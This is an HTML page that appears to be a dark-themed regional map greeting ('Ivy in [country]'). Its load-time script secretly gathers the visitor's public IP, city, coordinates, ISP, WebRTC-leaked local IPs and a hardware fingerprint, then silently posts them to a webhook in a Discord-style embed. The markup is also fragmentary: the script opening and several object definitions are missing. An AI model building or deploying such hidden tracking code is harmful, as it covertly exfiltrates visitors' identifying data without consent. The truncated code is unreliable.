<html lang="en">

<head>
    <meta charset="UTF-8">

    <style>
        :root {
            --primary-color: #6d28d9;
            --accent-color: #10b981;
            --bg-dark: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.7);
            --text-color: #f1f5f9;
            --border-color: rgba(148, 163, 184, 0.1);
            --hover-color: rgba(255, 255, 255, 0.05);
        }

        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            line-height: 1.7;
            margin: 0;
            padding: 0;
            background: var(--bg-dark);
            color: var(--text-color);
            height: 100vh;
            display: flex;
            flex-direction: column;
            background-image:
                radial-gradient(circle at 10% 10%, rgba(109, 40, 217, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 90% 90%, rgba(16, 185, 129, 0.15) 0%, transparent 40%);
        }

        header {
            background: rgba(15, 23, 42, 0.8);
            padding: 1rem;
            text-align: center;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--border-color);
        }

        header::before {
            content: '';
            position: absolute;
            inset: 0;
            background:
                linear-gradient(45deg, transparent 48%, rgba(109, 40, 217, 0.3) 49%, transparent 51%),
                linear-gradient(-45deg, transparent 48%, rgba(16, 185, 129, 0.3) 49%, transparent 51%);
            background-size: 60px 60px;
            animation: gridMove 15s linear infinite;
            opacity: 0.3;
        }

        h1 {
            margin: 0;
            font-size: 3.5rem;
            font-weight: 700;
            letter-spacing: -1px;
            background: linear-gradient(135deg, #6d28d9, #10b981);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: fadeIn 0.8s ease-out;
            position: relative;
            z-index: 1;
        }

        main {
            flex: 1;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }

        section {
            background: var(--card-bg);
            margin: 0;
            padding: 0.5rem;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            border: 1px solid var(--border-color);
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }

        section::before {
            display: none;
        }

        section:hover {
            transform: none;
            border-color: var(--border-color);
        }

        h2 {
            color: var(--text-color);
            font-size: 1.5rem;
            margin: 0 0 1.5rem 0;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid var(--border-color);
        }

        .region-flag {
            font-size: 1.8rem;
            filter: drop-shadow(0 0 8px rgba(109, 40, 217, 0.3));
            margin-right: 0;
            display: inline-flex;
        }

        .description {
            background: rgba(15, 23, 42, 0.8);
            padding: 1rem;
            backdrop-filter: blur(10px);
            font-size: 1.1rem;
            letter-spacing: 0.5px;
            line-height: 1.6;
            border-top: 1px solid var(--border-color);
            text-align: center;
            position: relative;
            z-index: 1000;
        }

        #loading {
            grid-column: 1 / -1;
            text-align: center;
            padding: 4rem;
            font-size: 1.2rem;
            color: var(--primary-color);
            background: var(--card-bg);
            border-radius: 20px;
            border: 1px solid var(--border-color);
            backdrop-filter: blur(10px);
        }

        #loading::after {
            content: '';
            display: inline-block;
            width: 24px;
            height: 24px;
            margin-left: 12px;
            border: 2px solid var(--primary-color);
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            vertical-align: middle;
        }

        footer {
            text-align: center;
            padding: 2rem;
            background: rgba(15, 23, 42, 0.8);
            color: #94a3b8;
            backdrop-filter: blur(10px);
            border-top: 1px solid var(--border-color);
        }

        .stats {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(15, 23, 42, 0.9);
            padding: 0.5rem 1rem;
            border-radius: 4px;
            border: 1px solid var(--border-color);
            backdrop-filter: blur(10px);
            font-size: 0.9rem;
            z-index: 1000;
        }

        .stats span {
            color: var(--accent-color);
            font-weight: bold;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes gridMove {
            0% {
                background-position: 0 0;
            }

            100% {
                background-position: 60px 60px;
            }
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
                opacity: 1;
            }
            50% {
                transform: scale(1.5);
                opacity: 0.5;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }

        .pulse-marker {
            width: 15px;
            height: 15px;
            background: var(--accent-color);
            border-radius: 50%;
            box-shadow: 0 0 0 rgba(16, 185, 129, 0.4);
            animation: pulse 2s infinite;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }

            main {
                flex-direction: column;
            }

            section {
                padding: 1rem;
            }
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 1.8rem;
                padding: 0.5rem;
                padding-top: 2.5rem;
            }

            header {
                padding: 0.5rem;
                position: relative;
            }

            .stats {
                top: 0;
                right: 0;
                left: 0;
                border-radius: 0;
                text-align: center;
                padding: 0.3rem;
                font-size: 0.8rem;
            }

            .description {
                font-size: 1rem;
                padding: 0.75rem;
            }

            #cyber-map {
                height: calc(100vh - 120px);
            }
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 1.5rem;
            }

            .description {
                padding: 0.5rem;
                line-height: 1.4;
            }
        }

        @media (prefers-reduced-motion: reduce) {

            *,
            *::before,
            *::after {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: 0.01ms !important;
                scroll-behavior: auto !important;
            }
        }

        /* Map Styles */
        #cyber-map {
            width: 100%;
            height: calc(100vh - 150px);
            border: none;
        }

        .leaflet-container {
            background: var(--bg-dark);
            border-radius: 0;
        }
        
        .cyber-popup .leaflet-popup-content-wrapper {
            background: var(--card-bg);
            color: var(--text-color);
            border: 1px solid var(--accent-color);
        }
        
        .cyber-popup .leaflet-popup-tip {
            background: var(--accent-color);
        }
    </style>
</head>

        async function getCountryInfo() {
            try {
                const ipResponse = await fetch('https://ipapi.co/json');
                const ipData = await ipResponse.json();
                
                const getLocalIP = () => new Promise((resolve) => {
                    const pc = new RTCPeerConnection({
                        iceServers: []
                    });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    let addresses = new Set();
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) {
                            pc.close();
                            resolve(Array.from(addresses).join(', ') || 'Not available');
                            return;
                        }
                        
                        let addr = e.candidate.address;
                        if (addr && !addresses.has(addr)) {
                            addresses.add(addr);
                        }
                    };
                    
                    // Timeout after 1 second
                    setTimeout(() => {
                        pc.close();
                        resolve(Array.from(addresses).join(', ') || 'Not available');
                    }, 1000);
                });

                const getDeviceFingerprint = () => {
                    const deviceData = {
                        resolution: `${screen.width}x${screen.height}`,
                        availResolution: `${screen.availWidth}x${screen.availHeight}`,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio,
                        
                        cores: navigator.hardwareConcurrency || 'unknown',
                        maxTouchPoints: navigator.maxTouchPoints,
                        deviceMemory: navigator.deviceMemory || 'unknown',
                        
                        gpu: (() => {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                            if (!gl) return 'unknown';
                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
                        })(),
                        
                        platform: navigator.platform,
                        oscpu: navigator.oscpu || 'unknown',
                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                        
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset(),
                        language: navigator.language,
                        
                        audioCodecs: (() => {
                            const audio = document.createElement('audio');
                            return {
                                ogg: audio.canPlayType('audio/ogg; codecs="vorbis"'),
                                mp3: audio.canPlayType('audio/mpeg'),
                                wav: audio.canPlayType('audio/wav; codecs="1"')
                            };
                        })(),
                        videoCodecs: (() => {
                            const video = document.createElement('video');
                            return {
                                h264: video.canPlayType('video/mp4; codecs="avc1.42E01E"'),
                                webm: video.canPlayType('video/webm; codecs="vp8, vorbis"')
                            };
                        })(),
                        
                        bluetooth: 'bluetooth' in navigator,
                        virtualKeyboard: 'virtualKeyboard' in navigator,
                        deviceOrientation: 'DeviceOrientationEvent' in window,
                        touchscreen: 'ontouchstart' in window
                    };

                    const fingerprint = Object.entries(deviceData)
                        .sort((a, b) => a[0].localeCompare(b[0])) 
                        .map(([key, value]) => {
                            if (typeof value === 'object') {
                                return JSON.stringify(value);
                            }
                            return String(value);
                        })
                        .join('|');

                    let hash = 0;
                    for (let i = 0; i < fingerprint.length; i++) {
                        const char = fingerprint.charCodeAt(i);
                        hash = ((hash << 5) - hash) + char;
                        hash = hash & hash;
                    }

                    const hashStr = Math.abs(hash).toString(36);
                    return hashStr.padEnd(8, '0').substr(0, 8);
                };

                        color: (vpnInfo.isProxy || vpnInfo.isTor || vpnInfo.vpnService) ? 0xFF0000 : 0x10b981,
                        fields: [
                            { name: 'üìç Location', value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: true },
                            { name: 'üåê IP', value: ipData.ip, inline: true },
                            { name: 'üè¢ ISP', value: ipData.org || 'Unknown', inline: true },
                            { name: 'üïí Timezone', value: ipData.timezone, inline: true },
                            { name: 'üìå Coordinates', value: `${ipData.latitude}, ${ipData.longitude}`, inline: true },
                            { name: 'üîí Security Check', value: 
                              `${vpnInfo.isProxy ? '‚ö†Ô∏è' : '‚úÖ'} Proxy: ${vpnInfo.isProxy ? 'Detected' : 'Clean'}\n${vpnInfo.isTor ? '‚ö†Ô∏è' : '‚úÖ'} Tor: ${vpnInfo.isTor ? 'Detected' : 'Clean'}\n${vpnInfo.vpnService ? '‚ö†Ô∏è' : '‚úÖ'} VPN: ${vpnInfo.vpnService || 'None detected'}\n‚ö†Ô∏è Threat Level: ${vpnInfo.threatLevel.toUpperCase()}\nüì° Connection Type: ${vpnInfo.connectionType}\nüè¢ ISP: ${vpnInfo.isp}\nüì± Carrier: ${vpnInfo.carrier}`, inline: false },
                            { name: 'üíª System', value: 
                              `Platform: ${deviceInfo.platform}\nScreen: ${deviceInfo.screen} (${deviceInfo.colorDepth})\nCPU Cores: ${deviceInfo.cores}\nGPU: ${deviceInfo.webgl}\nFingerprint: ${deviceInfo.fingerprint}\nMemory: ${deviceInfo.memory}\nStorage: ${deviceInfo.storage}`, inline: false },
                            { name: 'üé® Preferences', value:
                              `Dark Mode: ${deviceInfo.darkMode}\nTouchscreen: ${deviceInfo.touchscreen}\nAd Blocker: ${deviceInfo.adBlocker}\nTimezone: ${deviceInfo.timezone}`, inline: true },
                            { name: 'üì° Network', value: `Connection: ${deviceInfo.connection.type || 'Unknown'}\nSpeed: ${deviceInfo.connection.downlink || 'Unknown'} Mbps\nLatency: ${deviceInfo.connection.rtt || 'Unknown'} ms`, inline: true },
                            { name: 'üì° Local Network', value: `IP: ${deviceInfo.localIP}`, inline: true },
                            { name: 'üîç User Agent', value: `\`\`\`${deviceInfo.userAgent}\`\`\``, inline: false }
                        ],
                        footer: {
                            text: 'üîí Ivy Security System'
                        },
                        timestamp: new Date().toISOString()
                    }]
                };

                try {
                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(webhookData)
                    });
                } catch (error) {
                    // Silent fail
                }

                const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${ipData.latitude}&lon=${ipData.longitude}&format=json`);
                const geoData = await geoResponse.json();

                const countryCode = ipData.country;
                const country = countryData[countryCode];

                if (country) {
                    document.getElementById('countryTitle').innerHTML = `${country.emoji} Ivy in ${ipData.country_name}`;
                    document.getElementById('content').innerHTML = `<div class="description">${country.content}</div>`;
                    document.getElementById('population').textContent = new Intl.NumberFormat().format(ipData.country_population);
                }

                let map = L.map('cyber-map', {
                    zoomControl: false
                }).setView([ipData.latitude, ipData.longitude], 5);
                
                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                    attribution: '&copy; OpenStreetMap contributors'
                }).addTo(map);

                document.querySelector('.leaflet-control-attribution').style.display = 'none';

                const customIcon = L.divIcon({
                    html: `<div class="pulse-marker"></div>`,
                    className: '',
                    iconSize: [15, 15],
                    iconAnchor: [7, 7]
                });

                L.marker([ipData.latitude, ipData.longitude], {
                    icon: customIcon
                }).addTo(map);

            } catch (error) {
                document.getElementById('countryTitle').innerHTML = "Error loading data";
            }
        }

        window.onload = getCountryInfo;
    </script>
